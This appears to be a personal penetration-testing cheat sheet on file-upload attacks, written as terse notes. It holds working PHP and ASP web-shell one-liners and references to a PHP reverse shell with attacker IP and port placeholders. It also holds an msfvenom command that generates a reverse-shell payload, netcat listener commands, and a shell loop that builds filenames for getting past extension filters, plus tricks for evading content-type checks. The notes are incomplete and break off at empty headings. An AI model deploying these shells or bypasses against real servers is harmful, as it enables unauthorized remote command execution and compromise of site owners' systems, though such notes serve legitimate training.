Find out hostname word
<?php system('hostname'); ?>


Web Shell - PHP
https://github.com/Arrexel/phpbash
/opt/useful/SecLists/Web-Shells


*********************************************************	BYPASSING FILTERS *******************************************
<?php system($_REQUEST['cmd']); ?>. // URL/name.php?cmd=
<% eval request('cmd') %> asp
IF there is front end validation then -> Burp!! just change file name=!!
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
And then in source code read for uploads directory on inspect page (where the file is uploaded).

**Reverse Shell - PHP**
https://github.com/pentestmonkey/php-reverse-shell
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
our machine: nc -lvnp ourPort

**Custom Reverse Shell**
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
(Similarly, we can generate reverse shell scripts for several languages. We can use many reverse shell payloads with the -p flag and specify the output language with the -f flag.)
our machine: nc -lvnp ourPort

**BLACKLISTED FILTERS**
Workaround - run from seclists looking for allowed extension (select .png) and run into allowed webshell
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt - fuzzing web extensions
.phar is working


**WHITEHAT FILTERS**
1.Check whitelist extensions
2.Double Extensions**
(htb.phar.jpeg is working)
investigate: Burp-Intruder -> https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt 
3.Reverse Double Extension
Investigate : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
4.Character Injection**
(shell.php%00.jpg) 
    %20
    %0a
    %00
    %0d0a
    /
    .\
    .
    …
    :

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

**TYPE FILTERS**
1.Content-Type
There are two common methods for validating the file content: Content-Type Header or File Content. 
CHecking: https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt

2.MIME-Type

														OTHER UPLOAD ATTACKS



